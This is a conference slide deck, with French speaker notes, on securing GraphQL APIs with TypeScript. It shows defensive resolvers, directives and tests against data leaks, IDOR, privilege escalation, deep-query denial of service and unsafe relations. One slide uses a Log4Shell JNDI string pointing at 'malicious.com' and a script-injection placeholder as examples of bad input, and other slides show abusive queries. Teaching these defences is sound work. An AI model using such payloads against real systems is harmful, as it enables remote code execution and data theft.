---
theme: seriph
themeConfig:
  primary: '#B090EF'
  secondary: '#FF8200'
  fonts: 'Space Grotesk Medium'
class: 'text-center'
highlighter: shiki
color: '#FF8200'
image: /assets/07_WHY_KILI_output.gif
layout: image-right
lineNumbers: false
drawings:
  persist: false
shortSwipes: false
---

# Secure GraphQL APIs with TypeScript

pierre.marcenac@kili-technology.com

<img src="/assets/kili-logo.png" class="h-15" style="position: absolute; margin-top: 300px;"/>

<img src="/assets/archilocus-logo.png" class="h-15" style="position: absolute; margin-left: 140px; margin-top: 300px;"/>

<style>

</style>

<!--

Pas besoin de s'y connaitre en secu

pas besoin de connaître GraphQL

pas besoin de connaitre TypeScript

-->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Kili Technology

AI is changing the world

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">

<img src="/assets/car_without_annotations.jpeg" class="h-50" />

</v-click>

</div>

<v-click at="2">

<video playsinline autoplay muted loop playbackRate="3.0">
  <source src="/assets/car-with-annotations.mp4" type="video/mp4">
</video>

</v-click>

<v-click at="3">

<div>

Lead developer & first employee

<carbon-logo-linkedin /> [Pierre Marcenac](https://www.linkedin.com/in/pierre-marcenac)

<carbon-logo-github /> [marcenacp](https://github.com/marcenacp)

<carbon-logo-twitter /> [marcenac](https://twitter.com/marcenac)

</div>

</v-click>

</div>

<!-- 
AI is changing the world. L'IA transforme le monde

Je pense que vous vous en êtes rendus compte et c'est le constat qu'on fait chez Kili. L'IA est partout. Dans vos téléphones quand vous dites "Hey Google"
Pour trier vos emails, pour vous suggérer des corrections quand vous tapez sur Word
Dans les services après-vente, quand vous discutez avec des conseillers en ligne.

Exemple de la voiture autonome qui va bientot devenir très concret pour nous tous. La voiture autonome fonctionne avec un algorithme qui lui dit d'accélérer ou de freiner suivant si d'autres voitures / d'autres pietons sont à proximité. Derrière pour que cet algorithme puisse apprendre.

Il n'y a pas de magie

Donc nous chez Kili, comme nous sommes garants de la sécurité de la donnée de nos clients, la sécurité est une priorité

SOC2, pentester sur notre schéma GraphQL
 -->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# GraphQL: Tale of a disaster

In 2021, Flink and Gorillas (grocery delivery) get hacked

<div grid="~ cols-2 gap-4" v-click>

<div>

- ☠️ Breached data includes data from:
  - Customers: names / addresses / emails / phones
  - Workers: names / phones
- ✍️ Read the full story on https://zerforschung.org/posts/gorillas-en

<img src="/assets/strasse.png" class="h-50" style="margin: 40px;"/>

</div>

<div>

![Gorillas Leaked Data](/assets/gorillas-leaked-data.png)

</div>
</div>

<!-- 
La sécu en GraphQL c'est la cata.

Ca a été l'année dernière très critique pour deux géants européens de la livraison à domicile : Gorillas et Flink

Sur leur site internet, Zerforschung (groupe allemand de recherche en sécurité) raconte comment ils ont hacké Gorillas

Accès à des buckets

Accès à un endpoint non sécurisé
 -->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Yet, GraphQL is powerful...

Client-oriented API paradigm for relational schemas and multi-service architectures

<div grid="~ cols-3 gap-4">

<v-click at="1">

<img src="/assets/relation-diagram.png" class="h-100" style="margin-left: 50px"/>

</v-click>

<v-click at="2">

```graphql {none|1-5|6-11|13-20|none}
type Organization {
  id: ID!
  name: String!
  users: [User!]
}

type User {
  id: ID!
  name: String!
  organization: Organization!
  projects: [Project!]
}

type Project {
  author: User!
  id: ID!
  title: String!
  users: [User!]
}
```

</v-click>

<v-click at="6">

<!-- REGARDER VIDEO : souscription jsute dire streaming
en REST tu as:
fields?subject,author_name en REST

BFF: Backend for frontend

Parler BFF et que ça scale pas cf https://www.youtube.com/watch?v=cJzPONmQT3E -->

```graphql {none|1-7|9-16|18-22}
query {
  projects() {
    author {
      name
    }
  }
}

query {
  projects() {
    users {
      name
      organization { name }
    }
  }
}

mutation {
  addUserToProject(data, where) {
    id
  }
}
```

</v-click>

</div>

<!-- 
Pourtant GraphQL c'est une brique plutôt cool et assez puissante à avoir dans son architecture

Décrire schéma

Et donc c'est ce qu'on appelle le schéma GraphQL

 -->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Yet, GraphQL is powerful...

GraphQL in the global architecture

<v-click at="1">

<img src="/assets/archi.png"/>

<div grid="~ cols-3 gap-4">

<v-click at="2">

<div>

```graphql
# POST /graphql
query {
  users() {
    name
  }
}
```

</div>

</v-click>

<v-click at="3">

<div>

```typescript
// GraphQL schema

const users = () => {
  return orm.getUsers();
}
```

</div>

</v-click>

</div>

</v-click>

<!-- Pour nous la developer experience est très importante car la moitié de nos clients sont des data scientists. Donc on utilise GraphQL pour cette flexibilité

Chaque projet IA est différent (centré sur la qualité, centré sur le volume) => s'adapter aux workflows

On a un métier très frontend, ce sont des interfaces, donc on veut donner la main au frontend -->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Yet, GraphQL is powerful...

Strongly typed with validation

<div>

```graphql {all|none}
mutation {
  createProject(title: "foo", numberOfUsers: 42) {
    id
  }
}
```

</div>

<div grid="~ cols-2 gap-2">

<v-click at="1">

```typescript {1,13-20|3,4,5|6-10|none}
const PageSize = (maximum: number): GraphQLScalarType => {
  const serialize = (pageSize: number): number | null => {
    if (pageSize < 0) {
      throw new GraphQLError(`value should be >= 0`);
    }
    if (pageSize > maximum) {
      throw new GraphQLError(
        `value should be <= ${maximum}.`
      );
    }
    return pageSize;
  };
  return new GraphQLScalarType({
    name: 'PageSize',
    serialize,
  });
};
```

</v-click>

<v-click at="6">

```graphql
type Query {
  """
  List all users page by page
  """
  users(pageSize: PageSize!, skip: number!): [User!]
}
```

</v-click>

</div>

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# GraphQL also faces some challenges

Challenges

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">

- 👶 Less mature than REST

<img src="/assets/usage-rest.png" class="h-70"/>
<span style="font-size: 9px; padding:0px; margin:0px">

(Source: ["The State of API 2020 Report"](https://smartbear.com/resources/ebooks/the-state-of-api-2020-report/))

</span>

</v-click>

<v-click at="2">

- 🔭 Apollo ecosystem (observability, schema)

</v-click>

</div>

<div v-click="3">

- 🔐 Security!

</div>

</div>

---
layout: center
class: text-center
---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# 1. Generic security challenges

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Access leaked critical information

Access fields I should not have access to

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">
<img src="/assets/project-and-users.png" class="h-30" style="margin-left:150px"/>
</v-click>

<v-click at="2">

```graphql {none|1,2,16,17|4-6|8-10|12-14|none}
query {
	users({ "where": { "name": "bob"} }) {

		# Technically sensitive information
		apiKey
		authenticationId

		# Business sensitive information
		rib
		someKpi

		# Database information
		createdAt
		updatedAt

	}
}
```

</v-click>

</div>

<div>

<v-click at="8">

```graphql {all|none}
directive @obfuscateUser(default: String!)
  on FIELD_DEFINITION
```

</v-click>

<v-click at="9">

```typescript {none|2-4,17|10-15|all}
// Applied for every node
const obfuscateUser: KiliFieldDirective<User, Args> = (
  fieldConfig,
  directive
) => {
  const { resolve } = fieldConfig;
  const { default } = directive;

  fieldConfig.resolve = (source, args, context, info) => {
    // Current user is in the context with authentication
    const { me } = context;
    if (source?.id === me?.id) {
      return resolve(source, args, context, info);
    }
    return obfuscated(default);
  };
  return fieldConfig;
};
```

</v-click>

</div>

</div>

<!-- Dans GraphQL il y a graphe

Cela n'a rien à voir avec les bases graphes. Mais surtout pour la sécurité

-->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Insecure direct object references (IDOR)

Access information I must not have access to

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">

```graphql {all|none}
query {
	users(where: { usersIDoNotHaveAccessTo }) {
		email
	}
}
```

</v-click>

</div>

<div>

<v-click at="2">

- Have well-tested queries for all categories `users`, `organization`, `projects`
- Implement business logic and test it thoroughly

</v-click>

<v-click at="3">

```typescript
describe('[UNIT TESTS] User > Queries', () => {
  describe('users', () => {
    it('AA Admin, in my project, I see all users', async () => {
      ...
    });

    it('AA User, in my project, I only see myself', async () => {
      ...
    });
  });
});
```

</v-click>

<v-click at="4">

- Physical separation between customers

</v-click>

</div>

</div>

<!--

Tester de manière extensive

-->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Priviledge elevation

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">

```graphql {all|none}
mutation {
	updatePropertiesInUser(
		data: { admin }
		where: { me }
	) {
		id
	}
}
```

</v-click>

</div>

<div>

<v-click at="2">

```graphql {4|all|none}
updatePropertiesInUser(
  data: DataProject!, where: WhereProject!
): Project!
  @hasSomeRole(
    projectRole: [ADMIN]
  )
```

</v-click>

<v-click at="6">

```typescript {none|1-4,16|8-13|all}
const hasSomeRole: HasSomeRoleDirective<Args> = (
  fieldConfig,
  directive
) => {
  const { resolve } = fieldConfig;
  const { projectRole } = directive;
  fieldConfig.resolve = async (_, args, context) => {
    const { me, models } = context;
    const iHaveProjectRole = await hasProjectRole(me);
    if (!iHaveProjectRole) {
      throw new KiliError('accessDenied', context);
    }
    return resolve(_, args, context);
  };
  return fieldConfig;
};
```

</v-click>

</div>

</div>

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Mutate with non authorized values

<div grid="~ cols-2 gap-4">

<div>

```graphql {1,16|2-3|5-10|none}
mutation {
  # This can corrupt your database #log4j
  changeEmail(email: "${jndi:ldap://malicious.com/file}")

  # This is dangerous for your users
  createAsset(content:
    "<script>
      This is malicious JavaScript code
    </script>"
  )
}

```

</div>

<div v-click="3">

- Validate user inputs with custom types!

```graphql {2-3|5-6|8-9|11-}
type Mutation {
  # Bad
  changeEmail(email: String!)

  # Good
  changeEmail(email: Email!)

  # Bad
  createAsset(content: String!)

  # Good
  createAsset(content: Content!)
}
```

</div>

</div>

---
layout: center
class: text-center
---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# 2. GraphQL-specific security breaches

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Denials of service

<div grid="~ cols-2 gap-4">

<div>

```graphql {none|3-6|8-21|all}
query {
  projectUsers {
    # Overflow the server
    complexResolver()
    ...
    complexResolver()

    # Recursive attacks
    projects {
      author {
        projects {
          author {
            projects {
              author {
                projects {
                  ...
                }
              }
            }
          }
        }
      }
    }
  }
}
```

</div>

<div>

<div v-click>

- Complexity `@complexity` directive

```graphql
  createProject(users: [User!]): Project!
    @complexity(value: 10)
```

</div>

<div v-click>

- Set a maximal depth limit (see [graphql-depth-limit](https://github.com/stems/graphql-depth-limit))

</div>

<div v-click>

- In-memory API rate limiter (see [graphql-rate-limit](https://github.com/teamplanes/graphql-rate-limit))

</div>

<div v-click>

- Custom type for pagination so that the user cannot retrieve more than 100 elements at once

</div>

</div>

</div>

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Access unsafe relations

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">

<img src="/assets/unsafe-relations.png" class="h-60" style="margin-left:100px;"/>

</v-click>

<v-click at="2">

```graphql {all|none}
query {
  projects(where: { id: "1" }) {
    users {
      projects {
        content
      }
    }
  }
}
```

</v-click>

</div>

<div>

<v-click at="3">

```typescript {none|1,17|1,11-15,17|all}
function safeRelation<Parent, Args, Return>(
  relation: Relation,
  model: keyof PossibleModels
): GraphQLRelation<Parent, Args, Return> {
  return async function (
    parent: Parent,
    args: Args,
    context: Context,
    info?: GraphQLResolveInfo
  ): Promise<Return> {
    // Check you have access to the parent
    // This query must be thoroughly tested!
    await hasOne(model, { id: parent.id }, context);
    // If yes, resolve the relation
    return relation(parent, args, context, info);
  };
}
```

</v-click>

</div>

</div>

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# TypeScript generics are really helpful

<div grid="~ cols-2 gap-4">

```typescript {all|12,14|none}
function userToProjectRelation(
  relation: UserRelation,
): UserRelation {
  return async function (
    user: User,
    args: ArgsUserRelation,
    context: Context,
    info?: GraphQLResolveInfo
  ): Promise<Project[]> {
    // Check you have access to the parent
    // This query must be thoroughly tested!
    await hasUser({ id: user.id }, context);
    // If yes, resolve the relation
    return projects(user, args, context, info);
  };
}
```

<v-click at="3">

```typescript
function safeRelation<Parent, Args, Return>(
  relation: Relation,
  model: keyof PossibleModels
): GraphQLRelation<Parent, Args, Return> {
  return async function (
    parent: Parent,
    args: Args,
    context: Context,
    info?: GraphQLResolveInfo
  ): Promise<Return> {
    // Check you have access to the parent
    // This query must be thoroughly tested!
    await hasOne(model, { id: parent.id }, context);
    // If yes, resolve the relation
    return relation(parent, args, context, info);
  };
}
```

</v-click>


</div>

<!-- Pas besoin d'implémenter à chaque fois

C'est moins explicite, mais on gagne en factorisation

-->

---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Access right management

I access data out of my perimeter

<div grid="~ cols-2 gap-4">

<div>

<v-click at="1">

```graphql {all|none}
mutation {
  addUserToProject(
    projectID: "IDoNotHaveAccessToThisProjectID"
    email: "hacker@gmail.com"
  ) {
    id
  }
}
```

</v-click>

<v-click at="2">

```graphql {all|none}
mutation {
	addUserToProject(
		data: {...}
		where: {...}
	) {
		id
	}
}
```

</v-click>

</div>

<div>

<v-click at="3">

```typescript {1,15-19,21|all}
export function safeMutation<
  Args extends { where: Where },
  Model,
  Return,
  Where
>(
  query: Query<Model, Where>,
  resolver: Mutation<{ dataToMutate: Model[]; args: Args }, Return>
): Mutation<Args, Return> {
  return async function (
    _: null,
    { data, where }: Args,
    context: Context
  ): Promise<Return> {
    const dataToMutate = await query(null, { where });
    if (dataToMutate.length === 0) {
      throw new KiliError('accessDenied');
    }
    return resolver(null, { data, dataToMutate }, context);
  };
}
```

</v-click>

</div>

</div>

---
layout: center
class: text-center
---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Conclusion

<!-- 
En conclusion:

Nous avons vu les principaux enjeux en terme de sécurité GraphQL

Certains assez gén´riques, d'autres vraiment spécifiques à GRaphQL

On a vu que TypeScript était un langage de choix avec GraphQL (écosystème bien développé, typing TypeScript et typing GraphQL, les generics permettent de vraiment sécuriser le graphe à n'importe quel endroit)

On a couvert pas mal d'autres sujets avec GraphQL chez Kili : notamment la performance

Si vous avez des questions, je serais heureux d'y répondre !


Avantage: casser le cycle de vie
 -->

---
layout: center
class: text-center
---

<img src="/assets/kili-logo.png" class="h-10" style="position: absolute; top: 40px; left: 850px;"/>

# Questions?

pierre.marcenac@kili-technology.com · [Kili](http://kili-technology.com/)
